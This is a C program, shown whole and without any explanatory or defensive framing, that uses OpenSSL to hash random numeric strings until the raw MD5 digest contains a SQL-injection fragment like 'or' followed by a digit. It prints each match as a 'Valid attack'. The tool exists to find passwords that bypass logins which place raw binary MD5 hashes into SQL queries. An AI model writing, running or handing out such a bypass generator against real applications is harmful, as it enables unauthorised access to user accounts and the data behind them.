#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/md5.h>
#include <time.h>
#include <limits.h>

void str2md5(const char *str, unsigned char *digest, int length) {
    int n;
    MD5_CTX c;
    MD5_Init(&c);

    while (length > 0) {
        if (length > 512) {
            MD5_Update(&c, str, 512);
        } else {
            MD5_Update(&c, str, length);
        }
        length -= 512;
        str += 512;
    }

    MD5_Final(digest, &c);
}

int valid(char *md5) {
    static const char *p[3] = {"'or'", "'||'", "'OR'"};
    int c, i, j, valid;
    for(c = 0; c < 12; c++) {
        if(md5[c] == '\'') {
            for(i = 0; i < 3; i++) {
                valid = 1;
                for(j = 1; j < 4; j++) {
                    if(p[i][j] != md5[c+j]) {
                        valid = 0;
                        break;
                    }
                }
                if(valid && (md5[c+4] <= '9') && (md5[c+4] >= '0')) {
                    return 1;
                }
            }
        }
    }
    return 0;
}

int main(int argc, char **argv) {
    int i;
    srand(time(NULL));
    //static const int max = INT_MAX;
    //int cent = max / 50;
    for(i = 0; ; i++) {
        if(i % 10000000 == 0) {
            printf("Hash #%d\n", i);
        }
        char str[256];
        int null = 0;
        char md5[16];
        int null2 = 0;
        sprintf(str, "%d%d%d%d", rand(), rand(), rand(), rand());
        str2md5(str, md5, strlen(str));
        if(valid(md5)) {
            printf("Valid attack: %s\n", str);
            fwrite(md5, 16, 1, stdout);
            printf("\n");
        }
    }
    return 0;
}
